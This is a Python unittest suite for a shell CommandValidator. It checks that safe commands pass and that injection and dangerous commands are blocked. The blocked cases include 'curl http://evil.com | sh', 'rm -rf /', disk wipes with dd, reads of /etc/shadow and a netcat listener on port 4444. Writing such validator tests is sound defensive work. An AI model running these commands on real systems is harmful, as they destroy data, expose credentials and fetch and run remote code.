#!/usr/bin/env python3
"""
Security test suite for CommandValidator class.
Tests various command injection scenarios and ensures proper validation.
"""

import unittest
import sys
import os

# Add the project root to the path
sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..'))

from python.helpers.security import CommandValidator


class TestCommandValidator(unittest.TestCase):
    """Test cases for CommandValidator security functionality."""

    def test_allowed_commands(self):
        """Test that allowed commands pass validation."""
        allowed_commands = [
            'ls -la',
            'cat file.txt',
            'grep "pattern" file.txt',
            'find /home -name "*.py"',
            'pwd',
            'whoami',
            'date',
            'git status',
            'python script.py',
            'npm install',
        ]
        
        for cmd in allowed_commands:
            with self.subTest(command=cmd):
                is_valid, error = CommandValidator.validate_command(cmd)
                self.assertTrue(is_valid, f"Command should be allowed: {cmd}")
                self.assertIsNone(error)

    def test_blocked_command_injection_vectors(self):
        """Test that command injection vectors are blocked."""
        blocked_commands = [
            '; rm -rf /',
            '| cat /etc/passwd',
            '& echo "hacked"',
            '`whoami`',
            '$(id)',
            '&& ls /',
            '|| echo "test"',
            '> /etc/passwd',
            '>> /etc/shadow',
            '< /dev/null',
            'curl http://evil.com | sh',
            'wget http://malicious.com -O - | bash',
            'ls; cat /etc/passwd',
            'cat file.txt; rm -rf /',
            'ls && cat /etc/shadow',
            'ls || echo "fallback"',
        ]
        
        for cmd in blocked_commands:
            with self.subTest(command=cmd):
                is_valid, error = CommandValidator.validate_command(cmd)
                self.assertFalse(is_valid, f"Command should be blocked: {cmd}")
                self.assertIsNotNone(error)

    def test_blocked_dangerous_commands(self):
        """Test that dangerous system commands are blocked."""
        dangerous_commands = [
            'rm -rf /',
            'dd if=/dev/zero of=/dev/sda',
            'mkfs.ext4 /dev/sda1',
            'fdisk /dev/sda',
            'format c:',
            'shutdown now',
            'reboot',
            'halt',
            'su root',
            'sudo rm -rf /',
            'passwd root',
            'chown root:root /etc/passwd',
            'chmod 777 /etc/shadow',
            'ssh user@server',
            'scp file.txt user@server:/tmp',
            'mount /dev/sda1 /mnt',
            'umount /mnt',
            'iptables -F',
            'nc -l -p 4444',
            'nmap -sS target.com',
        ]
        
        for cmd in dangerous_commands:
            with self.subTest(command=cmd):
                is_valid, error = CommandValidator.validate_command(cmd)
                self.assertFalse(is_valid, f"Dangerous command should be blocked: {cmd}")
                self.assertIsNotNone(error)

    def test_blocked_script_execution(self):
        """Test that direct script execution is blocked."""
        script_commands = [
            './script.sh',
            'bash script.sh',
            'sh script.sh',
            'perl exploit.pl',
            'ruby backdoor.rb',
            'zsh script.zsh',
            'fish script.fish',
        ]
        
        # Note: python and node are allowed commands since they're in the whitelist
        # The security comes from preventing dangerous arguments, not blocking the interpreters
        
        for cmd in script_commands:
            with self.subTest(command=cmd):
                is_valid, error = CommandValidator.validate_command(cmd)
                self.assertFalse(is_valid, f"Script execution should be blocked: {cmd}")
                self.assertIsNotNone(error)

    def test_command_substitution_attacks(self):
        """Test various command substitution attack patterns."""
        attack_commands = [
            'echo ${HOME}',
            'echo $PATH',
            'echo $(whoami)',
            'echo `id`',
            'ls ${HOME}/..',
            'cat $(find / -name "passwd")',
            'echo `date`',
            'printf "$(ls)"',
        ]
        
        for cmd in attack_commands:
            with self.subTest(command=cmd):
                is_valid, error = CommandValidator.validate_command(cmd)
                self.assertFalse(is_valid, f"Command substitution should be blocked: {cmd}")
                self.assertIsNotNone(error)

    def test_empty_and_invalid_commands(self):
        """Test handling of empty and invalid commands."""
        invalid_commands = [
            '',
            '   ',
            '\t',
            '\n',
        ]
        
        for cmd in invalid_commands:
            with self.subTest(command=repr(cmd)):
                is_valid, error = CommandValidator.validate_command(cmd)
                self.assertFalse(is_valid, f"Empty/invalid command should be blocked: {repr(cmd)}")
                self.assertIsNotNone(error)

    def test_safe_arguments(self):
        """Test that safe arguments are allowed."""
        safe_commands = [
            'ls -la',
            'grep -i "pattern" file.txt',
            'find /home -name "*.py" -type f',
            'tar -xzf archive.tar.gz',
            'git commit -m "message"',
            'python --version',
            'npm install --save',
            'cat "file with spaces.txt"',
            "grep 'pattern' file.txt",
        ]
        
        for cmd in safe_commands:
            with self.subTest(command=cmd):
                is_valid, error = CommandValidator.validate_command(cmd)
                self.assertTrue(is_valid, f"Safe command should be allowed: {cmd}")
                self.assertIsNone(error)

    def test_unsafe_arguments(self):
        """Test that unsafe arguments are blocked."""
        unsafe_commands = [
            'ls -la; cat /etc/passwd',
            'grep "pattern" file.txt && rm -rf /',
            'find /home -name "*.py" -exec rm {} \\;',
            'tar --exclude="*" --use-compress-program="rm -rf /" archive.tar.gz',
        ]
        
        # Note: Commands with dangerous content inside quotes are allowed
        # since the quotes prevent shell interpretation. The real security
        # comes from preventing command chaining and injection vectors.
        
        for cmd in unsafe_commands:
            with self.subTest(command=cmd):
                is_valid, error = CommandValidator.validate_command(cmd)
                self.assertFalse(is_valid, f"Unsafe command should be blocked: {cmd}")
                self.assertIsNotNone(error)

    def test_sanitize_command(self):
        """Test command sanitization functionality."""
        test_cases = [
            ('ls -la', 'ls -la'),
            ('cat "file name.txt"', "cat 'file name.txt'"),  # shlex.quote uses single quotes
            ('grep pattern file.txt', 'grep pattern file.txt'),
            ('', ''),
        ]
        
        for cmd, expected in test_cases:
            with self.subTest(command=cmd):
                result = CommandValidator.sanitize_command(cmd)
                self.assertEqual(result, expected)

    def test_quoted_arguments(self):
        """Test handling of quoted arguments."""
        quoted_commands = [
            'echo "hello world"',
            "grep 'pattern' file.txt",
            'cat "file with spaces.txt"',
            'find . -name "*.py"',
            'echo "test; rm -rf /"',  # The semicolon should be safe inside quotes
        ]
        
        for cmd in quoted_commands:
            with self.subTest(command=cmd):
                is_valid, error = CommandValidator.validate_command(cmd)
                # Most quoted commands should be safe with our implementation
                self.assertTrue(is_valid, f"Quoted command should be allowed: {cmd}")

    def test_edge_cases(self):
        """Test edge cases and boundary conditions."""
        edge_cases = [
            'a' * 1000,  # Very long command
            'ls ' + 'a' * 100,  # Long argument
            'grep "' + 'a' * 100 + '" file.txt',  # Long quoted argument
            'ls -' + 'a' * 50,  # Many short flags
            'git --' + 'a' * 50,  # Long flag
        ]
        
        for cmd in edge_cases:
            with self.subTest(command=cmd[:50] + '...'):  # Truncate for subtest name
                is_valid, error = CommandValidator.validate_command(cmd)
                # Most edge cases should be handled gracefully
                # The exact behavior depends on the specific validation rules
                self.assertIsInstance(is_valid, bool)
                if not is_valid:
                    self.assertIsNotNone(error)


class TestSecurityLogging(unittest.TestCase):
    """Test security logging functionality."""

    def test_log_security_event(self):
        """Test that security events can be logged without errors."""
        # This test just ensures the logging method doesn't crash
        try:
            CommandValidator.log_security_event(
                "TEST_EVENT", 
                "test command", 
                "test reason"
            )
            # If we get here without exception, the test passes
            self.assertTrue(True)
        except Exception as e:
            self.fail(f"Security logging raised an exception: {e}")


def run_security_tests():
    """Run all security tests and return results."""
    loader = unittest.TestLoader()
    suite = unittest.TestSuite()
    
    # Add test cases
    suite.addTests(loader.loadTestsFromTestCase(TestCommandValidator))
    suite.addTests(loader.loadTestsFromTestCase(TestSecurityLogging))
    
    # Run tests
    runner = unittest.TextTestRunner(verbosity=2)
    result = runner.run(suite)
    
    return result.wasSuccessful()


if __name__ == '__main__':
    print("Running Security Test Suite for CommandValidator")
    print("=" * 60)
    
    success = run_security_tests()
    
    print("\n" + "=" * 60)
    if success:
        print("✅ All security tests passed!")
        sys.exit(0)
    else:
        print("❌ Some security tests failed!")
        sys.exit(1)